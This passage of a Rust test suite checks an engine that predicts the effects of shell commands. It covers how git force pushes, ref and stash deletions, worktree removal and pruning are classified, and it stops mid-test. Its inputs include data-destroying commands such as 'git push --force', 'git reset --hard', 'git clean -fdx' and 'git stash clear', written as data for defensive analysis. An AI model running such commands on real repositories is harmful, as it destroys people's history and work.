fn p11_evidence_carries_no_report_line_citations() {
    fn assert_no_line_citation(value: &serde_json::Value, origin: &str) {
        match value {
            serde_json::Value::String(text) => {
                if let Some(rest) = text.split_once(".md:").map(|(_, rest)| rest) {
                    assert!(
                        !rest.starts_with(|c: char| c.is_ascii_digit()),
                        "{origin} cites a Markdown line: {text}"
                    );
                }
            }
            serde_json::Value::Array(values) => {
                values
                    .iter()
                    .for_each(|value| assert_no_line_citation(value, origin));
            }
            serde_json::Value::Object(entries) => {
                entries
                    .values()
                    .for_each(|value| assert_no_line_citation(value, origin));
            }
            _ => {}
        }
    }
    for origin in P11_SOURCE_RECORDS.iter().chain([&P18B_EVIDENCE]) {
        assert_no_line_citation(&read_json(origin), origin);
    }
}

#[test]
fn promoted_models_pin_the_bytes_of_their_reviewed_source_records() {
    let root = repository_root();
    for path in promoted_model_paths() {
        let source = std::fs::read_to_string(&path).unwrap();
        let document: serde_json::Value = serde_json::from_str(&source).unwrap();
        for source in document["provenance"]["sources"].as_array().unwrap() {
            let uri = source["uri"].as_str().unwrap();
            let Some(fixture) = uri.strip_prefix("fixture:") else {
                continue;
            };
            let fixture = fixture.split('#').next().unwrap();
            let bytes = std::fs::read(root.join("crates/effinterp-engine").join(fixture)).unwrap();
            assert_eq!(
                source["digest"].as_str().unwrap(),
                format!("blake3:{}", blake3::hash(&bytes).to_hex()),
                "{} does not pin the current bytes of {fixture}",
                path.display()
            );
        }
    }
}

/// Entry id -> (owning document identity, `<id>#blake3:<declaration digest>`)
/// as the promoted models on disk currently compile.
fn promoted_revisions() -> std::collections::BTreeMap<String, (String, String)> {
    let mut sources = Vec::new();
    let mut owners = Vec::new();
    for path in promoted_model_paths() {
        let source = std::fs::read_to_string(path).unwrap();
        let document: serde_json::Value = serde_json::from_str(&source).unwrap();
        for entry in document["entries"].as_array().unwrap() {
            owners.push((
                entry["id"].as_str().unwrap().to_string(),
                document["identity"].as_str().unwrap().to_string(),
            ));
        }
        sources.push(source);
    }
    let refs = sources.iter().map(String::as_str).collect::<Vec<_>>();
    let registry = effinterp_engine::compile_registry(&refs).unwrap();
    owners
        .into_iter()
        .map(|(id, identity)| {
            let digest = registry.declaration_digests().get(&id).unwrap();
            let revision = format!("{id}#blake3:{digest}");
            (id, (identity, revision))
        })
        .collect()
}

#[test]
fn p18b_promotion_evidence_records_regenerated_model_identities() {
    let current = promoted_revisions();
    let evidence = read_json(P18B_EVIDENCE);
    let mut recorded = BTreeSet::new();
    for revision in evidence["model_revisions"].as_array().unwrap() {
        let id = revision["id"].as_str().unwrap();
        let (identity, current_revision) = current
            .get(id)
            .unwrap_or_else(|| panic!("{id} is no longer promoted"));
        assert_eq!(revision["document_identity"], identity.as_str(), "{id}");
        assert_eq!(revision["revision"], current_revision.as_str(), "{id}");
        recorded.insert(current_revision.clone());
    }

    // Every other revision string in the evidence names one of those exact
    // revisions, so a refreshed identity cannot leave a dangling citation.
    fn assert_revisions_known(
        value: &serde_json::Value,
        recorded: &BTreeSet<String>,
        origin: &str,
    ) {
        match value {
            serde_json::Value::String(text) => assert!(
                !text.contains("@v1#") || recorded.contains(text),
                "{origin} cites stale revision {text}"
            ),
            serde_json::Value::Array(values) => values
                .iter()
                .for_each(|value| assert_revisions_known(value, recorded, origin)),
            serde_json::Value::Object(entries) => entries
                .values()
                .for_each(|value| assert_revisions_known(value, recorded, origin)),
            _ => {}
        }
    }
    assert_revisions_known(&evidence, &recorded, P18B_EVIDENCE);
}

#[test]
fn git_push_keeps_refspec_lease_and_option_values_distinct() {
    use serde_json::json;
    let assert_attributes =
        |actual: &serde_json::Value, expected: &serde_json::Value, argv: &[&str]| {
            for (key, value) in expected.as_object().unwrap() {
                assert_eq!(&actual[key], value, "{argv:?}: {key}");
            }
            for key in [
                "force",
                "lease",
                "delete",
                "mirror",
                "no_verify",
                "prune",
                "dry_run",
                "all",
            ] {
                assert_eq!(
                    actual[key],
                    expected.get(key).cloned().unwrap_or(json!(false)),
                    "{argv:?}: {key}"
                );
            }
            for key in ["refspec", "dst_ref"] {
                assert_eq!(actual.get(key), expected.get(key), "{argv:?}: {key}");
            }
            assert_eq!(
                actual["lease_targets"],
                expected.get("lease_targets").cloned().unwrap_or(json!([])),
                "{argv:?}"
            );
            assert_eq!(actual["lease_targets_complete"], json!(true), "{argv:?}");
            assert!(actual.get("lease_ref").is_none());
            assert!(actual.get("lease_target").is_none());
        };
    for (args, expected) in [
        (
            vec!["--force-with-lease", "origin", "main"],
            json!({"push":true,"refspec":"main","source_ref":"main","dst_ref":"main","lease":true,"explicit_force":false,"lease_requested":true,"all_refs_lease":true,"refspecs_complete":true}),
        ),
        (
            vec!["--force-with-lease=main:abc", "origin", "main"],
            json!({"push":true,"refspec":"main","dst_ref":"main","lease":true,"lease_targets":["main"]}),
        ),
        (
            vec!["--force-with-lease=other", "origin", "+main"],
            json!({"push":true,"refspec":"+main","dst_ref":"main","force":true,"lease_targets":["other"]}),
        ),
        (
            vec!["--force-w=other", "origin", "+main"],
            json!({"push":true,"refspec":"+main","dst_ref":"main","force":true,"lease_targets":["other"]}),
        ),
        (
            vec!["--force-with-lease=main", "origin", "+main"],
            json!({"push":true,"refspec":"+main","dst_ref":"main","force":true,"lease":true,"lease_targets":["main"]}),
        ),
        (
            vec!["--force-with-lease", "--force"],
            json!({"push":true,"force":true}),
        ),
        (
            vec!["--force-with-lease"],
            json!({"push":true,"lease":true}),
        ),
        (
            vec!["--force-with-lease=main"],
            json!({"push":true,"lease_targets":["main"]}),
        ),
        (
            vec!["-f", "origin", "main"],
            json!({"push":true,"force":true,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec!["origin", "+main"],
            json!({"push":true,"force":true,"refspec":"+main","source_ref":"main","dst_ref":"main","explicit_force":false,"refspec_forced":true}),
        ),
        (
            vec!["--mirror", "origin"],
            json!({"push":true,"force":true,"mirror":true}),
        ),
        (
            vec!["--force", "--repo", "--help", "origin", "main"],
            json!({"push":true,"force":true,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec!["origin", "HEAD:master"],
            json!({"push":true,"refspec":"HEAD:master","dst_ref":"master"}),
        ),
        (
            vec!["origin", "refs/heads/feature:refs/heads/main"],
            json!({"push":true,"refspec":"refs/heads/feature:refs/heads/main","dst_ref":"main"}),
        ),
        (
            vec!["origin", "main:feature"],
            json!({"push":true,"refspec":"main:feature","dst_ref":"feature"}),
        ),
        (
            vec!["-vd", "origin", "old"],
            json!({"push":true,"delete":true,"force":true,"refspec":"old","dst_ref":"old"}),
        ),
        (
            vec!["origin", "--delete", "old"],
            json!({"push":true,"delete":true,"force":true,"refspec":"old","dst_ref":"old"}),
        ),
        (
            vec!["origin", ":old"],
            json!({"push":true,"delete":false,"source_ref":"","force":true,"refspec":":old","dst_ref":"old"}),
        ),
        (
            vec![":main"],
            json!({"push":true,"delete":false,"source_ref":"","force":true,"refspec":":main","dst_ref":"main"}),
        ),
        (
            vec!["--no-verify", "origin", "main"],
            json!({"push":true,"no_verify":true,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec!["--dry-run", "origin", "main"],
            json!({"push":true,"dry_run":true,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec!["--dry-run", "--mirror", "origin"],
            json!({"push":true,"dry_run":true,"force":true,"mirror":true}),
        ),
        (
            vec!["--push-option", "ci.skip", "origin", "feature:main"],
            json!({"push":true,"refspec":"feature:main","dst_ref":"main"}),
        ),
        (
            vec!["--force", "--no-force", "origin", "main"],
            json!({"push":true,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec![
                "--force-with-lease",
                "--no-force-with-lease",
                "origin",
                "main",
            ],
            json!({"push":true,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec!["--fo", "origin", "main"],
            json!({"push":true,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec!["--no-force", "--force", "origin", "feature"],
            json!({"force":true,"explicit_force":true,"refspec":"feature","dst_ref":"feature"}),
        ),
        (
            vec![
                "--force-with-lease",
                "--dry-run",
                "--no-dry-run",
                "origin",
                "main",
            ],
            json!({"lease":true,"lease_requested":true,"all_refs_lease":true,"dry_run":false,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec![
                "--no-force-with-lease",
                "--force-with-lease=main",
                "origin",
                "main",
            ],
            json!({"lease":true,"lease_requested":true,"all_refs_lease":false,"lease_targets":["main"],"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec![
                "--force-with-lease",
                "--force-with-lease=other",
                "origin",
                "+main",
            ],
            json!({"force":true,"lease":true,"all_refs_lease":true,"lease_targets":["other"],"refspec":"+main","dst_ref":"main"}),
        ),
        (
            vec![
                "--force-with-lease=other",
                "--no-force-with-lease",
                "--force-with-lease=main",
                "origin",
                "main",
            ],
            json!({"lease":true,"all_refs_lease":false,"lease_targets":["main"],"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec!["--all", "--no-branches", "origin", "main"],
            json!({"all":false,"branches":false,"refspecs_complete":true,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec!["--branches", "--no-all", "origin", "main"],
            json!({"all":false,"branches":false,"refspecs_complete":true,"refspec":"main","dst_ref":"main"}),
        ),
        (
            vec!["origin", "tag", "main"],
            json!({"refspec":"refs/tags/main","source_ref":"refs/tags/main","dst_ref":"refs/tags/main","refspecs_complete":true}),
        ),
        (
            vec!["--force-with-lease", "--unknown", "origin", "main"],
            json!({"lease":true,"lease_requested":true,"refspec":"main","dst_ref":"main","refspecs_complete":false}),
        ),
        (
            vec!["-of", "origin", "main"],
            json!({"force":false,"refspec":"main","dst_ref":"main","refspecs_complete":true}),
        ),
        (
            vec!["-fo", "ci.skip", "origin", "main"],
            json!({"force":true,"refspec":"main","dst_ref":"main","refspecs_complete":true}),
        ),
    ] {
        let mut argv = vec!["git", "push"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/w"));
        let effects: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "git.remote_sync")
            .collect();
        assert_eq!(effects.len(), 1, "{argv:?}");
        assert_attributes(
            &serde_json::to_value(&effects[0].attributes).unwrap(),
            &expected,
            &argv,
        );
        assert!(has_effect(&plan, "network.upload", "?network"), "{argv:?}");
        assert!(has_boundary(&plan, "unmodeled_hooks"));
    }
    let plan = analyze(
        &[
            "git",
            "push",
            "--force-with-lease=feature",
            "--force-with-lease=other",
            "origin",
            "+feature",
            "+other",
        ],
        Some("/w"),
    );
    let syncs: Vec<_> = plan
        .effects
        .iter()
        .filter(|e| e.operation.0 == "git.remote_sync")
        .collect();
    assert_eq!(syncs.len(), 2);
    for effect in syncs {
        assert_eq!(effect.attributes.get("lease"), Some(&AttrValue::Bool(true)));
        assert_eq!(
            effect.attributes.get("lease_targets"),
            Some(&strings(&["feature", "other"]))
        );
        assert_eq!(
            effect.attributes.get("lease_targets_complete"),
            Some(&AttrValue::Bool(true))
        );
        assert!(!effect.attributes.contains_key("lease_ref"));
        assert!(!effect.attributes.contains_key("lease_target"));
    }
    for args in [
        vec!["origin", "tag"],
        vec!["origin", ":"],
        vec!["origin", "refs/heads/*:refs/heads/*"],
        vec!["--tags", "origin", "main"],
        vec!["--force=maybe", "origin", "main"],
    ] {
        let mut argv = vec!["git", "push"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.remote_sync", "refspecs_complete"),
            Some(AttrValue::Bool(false)),
            "{argv:?}"
        );
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }
    for (remote, host) in [
        ("git@github.com:org/repo.git", "github.com"),
        ("https://example.com/r.git", "example.com"),
        ("ssh://git@host:2222/repo.git", "host"),
    ] {
        for refs in [vec![], vec!["main"], vec!["HEAD:main", "+feature:other"]] {
            let mut argv = vec!["git", "push", "--force-with-lease=main", remote];
            argv.extend(&refs);
            let plan = analyze(&argv, Some("/w"));
            let effects: Vec<_> = plan
                .effects
                .iter()
                .filter(|e| e.operation.0 == "git.remote_sync")
                .collect();
            assert_eq!(effects.len(), refs.len().max(1), "{argv:?}");
            for (i, effect) in effects.iter().enumerate() {
                let mut expected = json!({"push":true,"lease_targets":["main"]});
                if let Some(refspec) = refs.get(i) {
                    expected["refspec"] = json!(refspec);
                    expected["dst_ref"] = json!(if i == 0 { "main" } else { "other" });
                    if i == 0 {
                        expected["lease"] = json!(true);
                    }
                    if refspec.starts_with('+') {
                        expected["force"] = json!(true);
                    }
                }
                assert_attributes(
                    &serde_json::to_value(&effect.attributes).unwrap(),
                    &expected,
                    &argv,
                );
            }
            assert!(plan.effects.iter().any(|e| e.operation.0 == "network.upload" && matches!(
                &e.resource, ResourceExpr::Concrete { identity: ResourceIdentity::NetworkEndpoint { host: actual, .. } } if actual == host
            )), "{argv:?}");
        }
    }
    for value_flag in ["-o", "--push-option", "--repo", "--receive-pack", "--exec"] {
        let plan = analyze(
            &["git", "push", value_flag, "--help", "origin", "main"],
            Some("/w"),
        );
        assert_eq!(
            attr(&plan, "git.remote_sync", "refspec"),
            Some(AttrValue::String("main".into()))
        );
    }
    for help in ["-h", "--help"] {
        let plan = analyze(&["git", "push", help, "origin", "main"], Some("/w"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| matches!(e.operation.0.as_str(), "git.remote_sync" | "network.upload"))
        );
        assert!(!has_boundary(&plan, "unmodeled_hooks"));
    }
    for (source, count) in [
        ("git push origin main feature:other", 2),
        ("git push -- \"$REMOTE\" main", 1),
        ("git push origin \"$REF\"", 1),
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        assert_eq!(
            plan.effects
                .iter()
                .filter(|e| e.operation.0 == "git.remote_sync")
                .count(),
            count
        );
        if source.contains("$REF") {
            assert_eq!(attr(&plan, "git.remote_sync", "refspec"), None);
        }
        if source.contains("$REMOTE") {
            assert_eq!(
                attr(&plan, "git.remote_sync", "refspec"),
                Some(AttrValue::String("main".into()))
            );
        }
    }
    for source in [
        r#"git push --force origin "$REF""#,
        r#"git push --force-with-lease origin "$REF""#,
        r#"git push --delete origin "$REF""#,
        r#"git push origin :"$REF""#,
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        let sync = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.remote_sync")
            .expect("symbolic push sync");
        assert_eq!(sync.attributes.get("dst_ref"), None, "{source}");
        assert_eq!(
            sync.attributes.get("force"),
            Some(&AttrValue::Bool(!source.contains("force-with-lease"))),
            "{source}"
        );
        let request = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.push_request")
            .expect("symbolic push request");
        assert_eq!(
            request.attributes.get("updated_destinations"),
            None,
            "{source}"
        );
        // A forced destination is a witness without its name; a deletion,
        // which the push guards name, is not.
        let forced: &[&str] = if source.contains("--force origin") {
            &[""]
        } else {
            &[]
        };
        assert_eq!(
            request.attributes.get("known_unleased_forced_destinations"),
            Some(&strings(forced)),
            "{source}"
        );
        assert_eq!(
            request.attributes.get("known_deleted_destinations"),
            Some(&strings(&[])),
            "{source}"
        );
        if source.contains("force-with-lease") {
            assert_eq!(
                request.attributes.get("lease_requested"),
                Some(&AttrValue::Bool(true))
            );
        }
    }
    for source in [
        "git push --force-with-lease --no-force-with-lease origin main",
        "git push --force-with-lease --dry-run origin main",
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        assert!(!plan.effects.iter().any(|effect| {
            effect.operation.0 == "git.push_request"
                && effect.attributes.get("force") == Some(&AttrValue::Bool(true))
        }));
    }
    let version = analyze(
        &[
            "git",
            "push",
            "--force-with-lease",
            "--version",
            "origin",
            "main",
        ],
        Some("/w"),
    );
    assert!(command_effects(&version).is_empty());
    assert!(version.boundaries.is_empty());
    assert_eq!(
        version.coverage.level(&Domain::new("git")),
        Some(CoverageLevel::Full)
    );
    let double_dash = analyze(&["git", "worktree", "--", "remove", "old"], Some("/w"));
    assert!(command_effects(&double_dash).is_empty());
    assert!(double_dash.boundaries.is_empty());
    assert_eq!(
        double_dash.coverage.level(&Domain::new("git")),
        Some(CoverageLevel::Full)
    );
    for source in [
        r#"git push "$REMOTE" main"#,
        r#"git push --"$OPTION" origin main"#,
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        assert_eq!(
            attr(&plan, "git.remote_sync", "refspecs_complete"),
            Some(AttrValue::Bool(false)),
            "{source}"
        );
        assert_eq!(attr(&plan, "git.remote_sync", "dry_run"), None, "{source}");
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{source}");
    }
    let plan = analyze(
        &["git", "-c", "advice.detachedHead=false", "push", "--mirror"],
        Some("/w"),
    );
    assert_eq!(
        attr(&plan, "git.remote_sync", "force"),
        Some(AttrValue::Bool(true))
    );
}

/// update-ref --stdin applies a ref command only when its transaction
/// commits: at the end of input without `start`, or at `commit`. git dies at
/// a refused line and keeps only the transactions it already committed.
/// `option no-deref` counts as a ref command. A line the model does not
/// classify (only some releases accept the `symref-*` verbs) ends what it
/// asserts: a boundary, earlier commits kept, nothing claimed after it.
#[test]
fn git_update_ref_stdin_deletes_only_committed_refs() {
    for (input, deleted, unmodeled) in [
        (
            "update refs/heads/a 0000000000000000000000000000000000000000\n",
            &["refs/heads/a"][..],
            false,
        ),
        ("update refs/heads/a \"\"\n", &["refs/heads/a"], false),
        ("delete \"refs/heads/\\141\"\n", &["refs/heads/a"], false),
        (
            "delete refs/heads/a\nstart\ndelete refs/heads/b\ncommit\n",
            &["refs/heads/a", "refs/heads/b"],
            false,
        ),
        (
            "start\ndelete refs/heads/a\ncommit\nstart\ndelete refs/heads/b\n",
            &["refs/heads/a"],
            false,
        ),
        (
            "start\ndelete refs/heads/a\ncommit\ndelete refs/heads/b\n",
            &["refs/heads/a"],
            false,
        ),
        ("delete refs/heads/a\nabort\n", &[], false),
        ("delete refs/heads/a\nprepare\n", &[], false),
        (
            "delete refs/heads/a\nprepare\ndelete refs/heads/b\ncommit\n",
            &[],
            false,
        ),
        ("start\nstart\ndelete refs/heads/a\ncommit\n", &[], false),
        ("delete refs/heads/a\ndelete refs/heads/a\n", &[], false),
        ("delete \"refs/heads/a\n", &[], false),
        (
            "update refs/heads/a 0000000000000000000000000000000000000000 0000000000000000000000000000000000000000\n",
            &[],
            false,
        ),
        (
            "start\ndelete refs/heads/a\ncommit\nstart\noption no-deref\ndelete refs/heads/b\ncommit\n",
            &["refs/heads/a", "refs/heads/b"],
            false,
        ),
        (
            "start\ndelete refs/heads/b\ncommit\nstart\ndelete refs/heads/a\nprepare\noption no-deref\ncommit\n",
            &["refs/heads/b"],
            false,
        ),
        ("option bogus\ndelete refs/heads/a\n", &[], false),
        (
            "delete refs/heads/b\ncommit\nsymref-create refs/heads/link refs/heads/main\ndelete refs/heads/a\n",
            &["refs/heads/b"],
            true,
        ),
        (
            "delete refs/heads/a\ncommit\nstart\ndelete \"refs/heads/\\377\"\ncommit\n",
            &["refs/heads/a"],
            true,
        ),
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: format!("git update-ref --stdin <<'EOF'\n{input}EOF"),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        let requested = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "git.ref_delete_request")
            .map(|effect| effect.attributes.get("ref").cloned())
            .collect::<Vec<_>>();
        let expected = deleted
            .iter()
            .map(|name| Some(AttrValue::String((*name).into())))
            .collect::<Vec<_>>();
        assert_eq!(requested, expected, "{input:?}");
        assert_eq!(
            has_boundary(&plan, "unmodeled_subcommand"),
            unmodeled,
            "{input:?}"
        );
    }
}

#[test]
fn git_ref_and_worktree_deletes_keep_their_targets() {
    for action in ["remove", "rm"] {
        let plan = analyze(&["git", "remote", action, "origin"], Some("/w"));
        let request = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.ref_delete_request")
            .expect("remote removal request");
        assert_eq!(
            request.request_assurance,
            effinterp_proto::RequestAssurance::Exact
        );
        assert_eq!(
            request.attributes.get("remote"),
            Some(&AttrValue::String("origin".into()))
        );
    }
    for argv in [
        ["git", "remote", "add", "origin", "https://example.com/repo"].as_slice(),
        ["git", "remote", "rename", "origin", "upstream"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "git.ref_delete_request"),
            "{argv:?}"
        );
    }
    for (argv, name) in [
        (vec!["git", "branch", "-D", "old"], "old"),
        (vec!["git", "tag", "--delete", "v1"], "v1"),
        (
            vec!["git", "update-ref", "-d", "refs/heads/old"],
            "refs/heads/old",
        ),
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.ref_update", "delete"),
            Some(AttrValue::Bool(true))
        );
        assert_eq!(
            attr(&plan, "git.ref_update", "ref"),
            Some(AttrValue::String(name.into()))
        );
        if argv[1] == "branch" {
            assert!(
                plan.effects
                    .iter()
                    .any(|effect| effect.operation.0 == "git.ref_delete_request")
            );
        } else {
            assert!(
                plan.effects
                    .iter()
                    .any(|effect| effect.operation.0 == "git.ref_delete_request")
            );
        }
    }
    let plan = analyze(&["git", "branch", "-d", "one", "two"], Some("/w"));
    assert_eq!(
        plan.effects
            .iter()
            .filter(|e| e.operation.0 == "git.ref_update")
            .count(),
        2
    );
    let plan = analyze(&["git", "update-ref", "refs/heads/main", "abc"], Some("/w"));
    assert_eq!(
        attr(&plan, "git.ref_update", "ref"),
        Some(AttrValue::String("refs/heads/main".into()))
    );
    for argv in [
        vec!["git", "update-ref", "--stdin"],
        vec!["git", "update-ref", "-z", "--stdin"],
        vec!["git", "update-ref", "--stdin", "refs/heads/main", "abc"],
        vec!["git", "update-ref"],
        vec!["git", "update-ref", "-d"],
        vec!["git", "update-ref", "refs/heads/main"],
        vec!["git", "submodule", "deinit"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(has_boundary(&plan, "unmodeled_subcommand"), "{argv:?}");
        assert_ne!(
            plan.coverage.level(&Domain::new("git")),
            Some(CoverageLevel::Full),
            "{argv:?}"
        );
        assert!(command_effects(&plan).is_empty(), "{argv:?}");
    }
    for argv in [
        vec![
            "git",
            "submodule",
            "deinit",
            "-f",
            "--all",
            "vendor/library",
        ],
        vec!["git", "worktree", "remove"],
        vec!["git", "worktree", "remove", "-f"],
        vec!["git", "worktree", "remove", "-f", "one", "two"],
        vec!["git", "worktree", "remove", "-f", "old", "--help"],
        vec!["git", "worktree", "remove", "-h", "old"],
        // git-submodule.sh reads deinit's options only by exact spelling,
        // and only `-q`/`--quiet` before `deinit`; any other option word
        // there is a usage error.
        vec!["git", "submodule", "deinit", "-qf", "vendor/library"],
        vec!["git", "submodule", "deinit", "-f", "--no-force", "lib"],
        vec!["git", "submodule", "deinit", "--forc", "vendor/library"],
        vec!["git", "submodule", "--cached", "deinit", "-f", "lib"],
        vec!["git", "submodule", "-f", "deinit", "vendor/library"],
        // An empty expiry, ref or repository stops git before it expires
        // anything; prune and reflog refuse an empty date even when a later
        // one follows.
        vec!["git", "gc", "--prune="],
        vec![
            "git",
            "reflog",
            "expire",
            "--expire=",
            "--expire=now",
            "--all",
        ],
        vec!["git", "prune", "--expire", ""],
        vec!["git", "reflog", "expire", "--expire-unreachable=", "--all"],
        vec!["git", "reflog", "expire", "--expire=now", ""],
        vec!["git", "--git-dir", "", "gc", "--prune=now"],
        vec!["git", "--work-tree=", "stash", "clear"],
        vec!["git", "--work-tree=", "push", "--force", "origin", "main"],
        vec!["git", "--git-dir=", "reset", "--hard"],
        vec!["git", "--work-tree", "", "clean", "-fdx"],
        vec!["git", "stash", "drop", ""],
        // gc reads the last `gc.pruneExpire` before its options and refuses
        // an empty one; section and variable names ignore case.
        vec!["git", "-c", "gc.pruneExpire=", "gc", "--prune=now"],
        vec![
            "git",
            "-c",
            "gc.pruneExpire=",
            "maintenance",
            "run",
            "--task",
            "gc",
        ],
        vec![
            "git",
            "-c",
            "GC.pruneexpire=now",
            "-c",
            "gc.PRUNEEXPIRE=",
            "gc",
        ],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(command_effects(&plan).is_empty(), "{argv:?}");
        assert!(plan.boundaries.is_empty(), "{argv:?}");
        assert_eq!(
            plan.coverage.level(&Domain::new("git")),
            Some(CoverageLevel::Full)
        );
    }
    // Every word after the first path is a pathspec, which a submodule
    // registered at `--force` matches: the force is the one before the path.
    for (argv, force) in [
        (
            vec!["git", "submodule", "deinit", "-f", "lib", "--force"],
            true,
        ),
        (vec!["git", "submodule", "deinit", "lib", "-f"], false),
    ] {
        let plan = analyze(&argv, Some("/w"));
        let request = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.worktree_discard_request")
            .expect("deinit request");
        assert_eq!(
            request.attributes.get("force"),
            Some(&AttrValue::Bool(force)),
            "{argv:?}"
        );
        assert!(
            matches!(
                request.attributes.get("selections"),
                Some(AttrValue::List(selections)) if selections.len() == 2
            ),
            "{argv:?}"
        );
    }
    let plan = analyze(&["git", "worktree", "remove", "--", "--help"], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));
    let plan = analyze(
        &["git", "worktree", "remove", "--unknown", "old"],
        Some("/w"),
    );
    assert!(has_boundary(&plan, "unrecognized_arguments"));
    for (argv, key, path) in [
        (
            vec!["git", "worktree", "remove", "-f", "../old"],
            "worktree_remove",
            Some("fs:/old"),
        ),
        (vec!["git", "worktree", "prune"], "worktree_prune", None),
        (
            vec!["git", "submodule", "deinit", "vendor/library"],
            "submodule",
            Some("fs:vendor/library"),
        ),
        (
            vec!["git", "submodule", "deinit", "--all"],
            "submodule",
            None,
        ),
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.worktree_discard", key),
            Some(AttrValue::Bool(true))
        );
        if key != "worktree_prune" {
            assert_eq!(
                attr(&plan, "git.worktree_discard", "discard_mode"),
                Some(AttrValue::String(
                    if key == "submodule" {
                        "submodule_deinit"
                    } else {
                        key
                    }
                    .into()
                ))
            );
        }
        let effect = plan
            .effects
            .iter()
            .find(|e| e.operation.0 == "git.worktree_discard")
            .unwrap();
        let ResourceExpr::Concrete {
            identity: ResourceIdentity::GitRepository { pathspec, .. },
        } = &effect.resource
        else {
            panic!()
        };
        assert_eq!(
            pathspec
                .as_deref()
                .map(effinterp_proto::display_resource)
                .as_deref(),
            path
        );
    }
    for (argv, op) in [
        (vec!["git", "commit", "-n"], "git.ref_update"),
        (vec!["git", "rebase", "--no-verify"], "git.history_rewrite"),
    ] {
        assert_eq!(
            attr(&analyze(&argv, Some("/w")), op, "no_verify"),
            Some(AttrValue::Bool(true))
        );
    }
    assert!(has_effect(
        &analyze(&["git", "stash", "drop"], Some("/w")),
        "git.recovery_destroy",
        "/w"
    ));
    for (argv, whole, target) in [
        (vec!["git", "stash", "drop"], false, None),
        (
            vec!["git", "stash", "drop", "stash@{2}"],
            false,
            Some("stash@{2}"),
        ),
        (vec!["git", "stash", "clear"], true, None),
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.ref_delete_request", "ref"),
            Some(AttrValue::String("refs/stash".into()))
        );
        assert_eq!(
            attr(&plan, "git.ref_delete_request", "broad"),
            Some(AttrValue::Bool(whole))
        );
        assert_eq!(
            attr(&plan, "git.ref_delete_request", "target"),
            target.map(|s| AttrValue::String(s.into()))
        );
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "git.recovery_destroy_request")
        );
    }
    let symbolic = Engine::new()
        .analyze(&Subject::Shell {
            source: "git stash drop \"$NAME\"".into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    let request = symbolic
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.recovery_destroy_request")
        .expect("stash recovery request");
    assert_eq!(
        request.attributes.get("target_complete"),
        Some(&AttrValue::Bool(false))
    );
    assert!(
        !symbolic
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "git.ref_delete_request")
    );
    assert!(has_boundary(&symbolic, "unrecognized_arguments"));
    let unknown = analyze(&["git", "stash", "drop", "--unknown"], Some("/w"));
    assert!(
        !unknown
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "git.recovery_destroy_request")
    );
}

#[test]
fn symbolic_operation_selectors_report_their_missing_behavior() {
    for (source, domain) in [
        ("docker cp \"$SOURCE\" /out", "container"),
        ("docker run -v \"$MOUNT\" alpine true", "filesystem"),
        ("mvn exec:java -f \"$POM\"", "database"),
        ("rsync -e \"$SHELL\" /source \"$DEST\"", "database"),
        ("tar --create \"$OPTION\"", "process"),
        ("vagrant \"$ACTION\"", "process"),
        ("multipass \"$ACTION\"", "process"),
        ("rabbitmqctl \"$ACTION\"", "messaging"),
        ("redis-cli \"$ACTION\"", "network"),
        ("npm \"$ACTION\"", "process"),
        ("php -n -d \"$SETTING\" -r 'echo 1;'", "filesystem"),
        ("node -r \"$PRELOAD\" -e '0'", "process"),
        ("bun --preload \"$PRELOAD\" app.ts", "process"),
        ("deno run --config \"$CONFIG\" app.ts", "process"),
        ("trap \"$CLEANUP\" EXIT; rm /known", "database"),
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: None,
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.domains.iter().any(|d| d.0 == domain)),
            "{source}"
        );
